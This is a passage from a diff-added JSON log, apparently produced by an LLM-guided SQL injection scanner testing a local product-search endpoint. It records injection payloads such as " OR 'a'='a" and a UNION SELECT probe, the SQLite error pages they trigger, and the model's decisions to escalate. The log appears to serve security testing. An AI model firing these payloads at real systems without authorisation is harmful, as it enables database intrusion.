+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2066,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2071,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 5,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='e",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2056,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2083,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 27,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='g",
+              "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2087,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 0,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Max attempts reached.",
+          "confirmation_rejections": [
+            {
+              "payload": "UNION SELECT NULL, NULL",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: String/search probe rejected because it lacks a string delimiter."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "String/search probe rejected because it lacks a string delimiter.",
+                "next_step": "Return only a parameter value that includes a quote or double-quote delimiter and a harmless boolean comparison."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            }
+          ]
+        }
+      ],
+      "parameter": "q",
+      "parameter_location": "query",
+      "path_index": null,
+      "original_value": null,
+      "payload": " OR 'a'='c",
+      "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
+      "expected_signal": "SQL parser error with a syntax error message",
+      "observed_signal": "sql_error",
+      "evidence": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> ",
+      "baseline_status": 200,
+      "probe_status": 500
+    },
+    {
+      "method": "GET",
+      "url": "http://127.0.0.1:8080/rest/products/search",
+      "path": "/rest/products/search",
+      "endpoint_context": {
+        "endpoint_type": "search",
+        "resource": "product search results",
+        "likely_sql_context": "string_search",
+        "recommended_attack_style": "string_search_error_probe",
+        "avoid_payload_styles": [
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "search endpoint with query parameter"
+      },
+      "target_params": [
+        {
+          "name": "q",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "search",
+            "resource": "product search results",
+            "likely_sql_context": "string_search",
+            "recommended_attack_style": "string_search_error_probe",
+            "avoid_payload_styles": [
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter",
+            "starting_strategy": "string_search_error_probe"
+          },
+          "payload_count": 7,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='a",
+              "payload_rationale": "string_search_error_probe",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2086,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2101,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "read_confirmation",
+              "payload": "UNION SELECT NULL, 'marker'",
+              "payload_rationale": "The payload string must come from your reasoning, not from code constants. Using UNION SELECT with a harmless marker string.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "marker",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2098,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2088,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 984,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='b",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2091,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2085,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": -6,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='c",
+              "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
+              "expected_signal": "SQL parser error with a syntax error message",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2064,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2103,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 39,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='d",
+              "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2066,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2071,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 5,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='e",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2056,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2083,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 27,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='g",
+              "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2087,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
